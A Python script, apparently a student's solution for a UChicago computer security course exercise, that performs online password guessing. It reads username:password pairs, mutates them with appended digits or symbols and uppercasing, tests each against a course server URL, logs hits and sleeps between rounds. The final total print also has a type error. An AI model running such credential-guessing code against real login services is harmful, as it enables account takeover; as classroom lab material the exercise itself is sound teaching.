from urllib.parse import quote
import urllib.request
import base64
import sys
import os
from time import sleep
from datetime import datetime
################################################################################
# 
# This starter file for UChicago CMSC 23200 / 33250 is for Python 3
#
################################################################################

################################################################################
# 
# make_query(username, password)
# -- username is a string that represents a potential username on the server
# -- password is a string that represents that user's potential password
#
################################################################################

def make_query(username, password):
    DEBUG = False; # Replace with "True" to print extra debugging information
    username = username.lower()
    if DEBUG:
        print("Querying the server")
        print("(username:", username, ")")
        print("(password:", password, ")")
    url = "https://uchicago.computer/" + urllib.parse.quote(username) + "/" + urllib.parse.quote(password) + "/"
    if DEBUG:
        print("(Querying:", url, ")")
    with urllib.request.urlopen(url) as response:
       return response.read().decode('utf-8')


def problem3(g_file, cycle, upp):
    cnt = 0
    tweaks = "0123456789$!"
    if ( cycle > 0 ):
        tweak = tweaks[cycle-1]
    else:
        tweak = ""

    with open("amiller68-problem3.txt", 'a+') as guessed:
        with open(g_file, 'r') as guesses:
            guess = guesses.readline()
            while guess:
                name = guess.strip().split(':')[0]
                pw   = guess.strip().split(':')[1]
                if(upp == 1):
                    pw=pw.upper()
                pw=pw+tweak
                if not name in guessed.read():
                    #ret = "Test"
                    ret = make_query(name, pw)
                    if ( ret == "Success" ):
                        cnt=cnt+1
                        print("Name: "+ name + " | PW: " + pw)
                        guessed.write(name + ":" + pw +"\n")
                guess = guesses.readline()
    
    guesses.close()
    guessed.close()
    return cnt


if __name__ == "__main__":
    #guess file for the program
    total = 0
    sleep_time = int(sys.argv[2])
    for i in range (0,12):

        print("Starting At: " + datetime.now().strftime("%H:%M:%S") )
        cnt = problem3(sys.argv[1], i, 0)
        total = total + cnt
        print("Found: " + str(cnt))
        print("Sleeping for: " + str(sleep_time))
        sleep(sleep_time)

    print("TOTAL: " + total)
''' 
        print("Starting At: " + datetime.now().strftime("%H:%M:%S") )
        cnt = problem3(sys.argv[1], i, 1)
        total = total + cnt
        print("Found: " + str(cnt))
        print("Sleeping for: " + str(sleep_time))
        sleep(sleep_time)
'''

